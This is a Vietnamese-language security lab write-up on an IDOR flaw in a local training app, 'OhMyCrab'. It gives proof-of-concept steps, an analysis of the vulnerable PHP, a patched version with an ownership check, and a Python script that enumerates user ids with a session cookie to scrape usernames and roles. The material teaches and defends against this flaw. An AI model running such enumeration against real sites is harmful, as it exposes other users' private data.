1. IDOR (Insecure Direct Object Reference)

URL: `http://127.0.0.1/OhMyCrab/modules/access_control/idor.php`

Ứng dụng tồn tại lỗ hổng IDOR do sử dụng trực tiếp tham số id từ phía client để truy vấn dữ liệu người dùng mà không kiểm tra quyền truy cập. Attacker có thể thay đổi giá trị id trên URL để truy cập hồ sơ của tài khoản khác.

PoC

- Đăng nhập bằng tài khoản caymai/caymai123

- Sau khi đăng nhập, ứng dụng tự động hiển thị profile của user hiện tại.

<img width="869" height="466" alt="image" src="https://github.com/user-attachments/assets/e0dc452a-cf59-4499-8310-86b8259df7c2" />

- Thay đổi URL: `http://127.0.0.1/OhMyCrab/modules/access_control/idor.php?id=3`, ứng dụng trả về thông tin tài khoản có ID = 3

<img width="866" height="441" alt="image" src="https://github.com/user-attachments/assets/747e13af-f754-494a-ab9e-aea12f09fde2" />

- Ứng dụng hiển thị dữ liệu của người dùng khác mặc dù attacker không sở hữu tài khoản đó nên attacker có thể enumerate user, truy cập trái phép dữ liệu người dùng khác.

Phân tích source code

```
    if ($session_user) {
        $stmt = mysqli_prepare($conn, "SELECT id FROM users WHERE username = ?");
        if ($stmt) {
            mysqli_stmt_bind_param($stmt, "s", $session_user);
            mysqli_stmt_execute($stmt);
            $res = mysqli_stmt_get_result($stmt);
            if ($row = mysqli_fetch_assoc($res)) {
                $session_id = $row['id'];
            }
            mysqli_stmt_close($stmt);
        }
    }
    if (!isset($_GET['id']) && $session_id) {
        header("Location: idor.php?id=" . $session_id);
        exit();
    }
```

- Ứng dụng tự động lấy id của user đang đăng nhập và redirect đến profile `header("Location: idor.php?id=" . $session_id);` nhưng vẫn cho phép người dùng truyền trực tiếp tham số id trên URL `$id = $_GET['id'];` và sử dụng giá trị này để truy vấn dữ liệu.

- Ứng dụng không kiểm tra user hiện tại có sở hữu resource hay không, có quyền truy cập hồ sơ khác hay không. Do đó attacker chỉ cần thay đổi giá trị id trên URL để truy cập trái phép dữ liệu của tài khoản khác.

Cách khắc phục

```
    if ($session_user) {
        $stmt = mysqli_prepare($conn, "SELECT id FROM users WHERE username = ?");
        if ($stmt) {
            mysqli_stmt_bind_param($stmt, "s", $session_user);
            mysqli_stmt_execute($stmt);
            $res = mysqli_stmt_get_result($stmt);
            if ($row = mysqli_fetch_assoc($res)) {
                $session_id = $row['id']; 
            }
            mysqli_stmt_close($stmt);
        }
    }
    if (!isset($_GET['id']) && $session_id) {
        header("Location: idor_fixed.php?id=" . $session_id);
        exit();
    }
    if (isset($_GET['id'])) {
        $requested_id = $_GET['id'];
        if ($requested_id != $session_id && ($_SESSION['role'] ?? '') !== 'admin') {
            die("<div class='content'><h2>Access Denied: Bạn không có quyền xem hồ sơ này!</h2></div>");
        }
        $sql = "SELECT id, username, role FROM users WHERE id = ?";
        $stmt = mysqli_prepare($conn, $sql);
        if ($stmt) {
            mysqli_stmt_bind_param($stmt, "i", $requested_id);
            mysqli_stmt_execute($stmt);
            $result = mysqli_stmt_get_result($stmt);
            $data = mysqli_fetch_assoc($result);
            mysqli_stmt_close($stmt);
        }
    }
```
- Sau khi khắc phục, ứng dụng xử lý: Đọc danh tính từ session an toàn ở server `$_SESSION['user']`, truy vấn ngầm để xác định ID của người dùng hiện tại `$session_id`, thực hiện việc phân quyền: `if ($requested_id != $session_id && ($_SESSION['role'] ?? '') !== 'admin')`
- Nếu ID trên URL `$requested_id` không trùng với ID người dùng hiện tại, ứng dụng sẽ lập tức chặn đứng hành vi và hủy thực thi `die()`, trừ tài khoản admin.

Script khai thác

```
import requests
import re

base_url = "http://127.0.0.1/OhMyCrab/modules/access_control/idor.php?id="
# Điền PHPSESSID sau khi đăng nhập lab
cookies = {
    "PHPSESSID": "h460dmg6ombudfrcjuho88avua"
}
for i in range(1, 10):
    url = base_url + str(i)
    response = requests.get(
        url,
        cookies=cookies,
        timeout=5
    )
    print(f"\nKiểm tra ID: {i}")
    if response.status_code == 200:
        if "Username:" in response.text:
            print("Phát hiện ID người dùng hợp lệ")
            username = re.search(
                r"<b>Username:</b>\s*(.*?)</p>",
                response.text
            )
            role = re.search(
                r"<b>Role:</b>\s*(.*?)</p>",
                response.text
            )
            if username:
                print("Username:", username.group(1))
            if role:
                print("Role:", role.group(1))
        else:
            print("Không có dữ liệu")
    else:
        print(f"HTTP Error: {response.status_code}")
```

- Script sử dụng thư viện requests để tự động gửi request đến endpoint IDOR với nhiều giá trị id khác nhau. Attacker sử dụng session hợp lệ sau khi đăng nhập và enumerate dữ liệu người dùng bằng cách thay đổi trực tiếp object identifier trên URL. Khi ứng dụng trả về thông tin profile tương ứng, attacker có thể xác định sự tồn tại của tài khoản và truy cập trái phép dữ liệu người dùng khác.
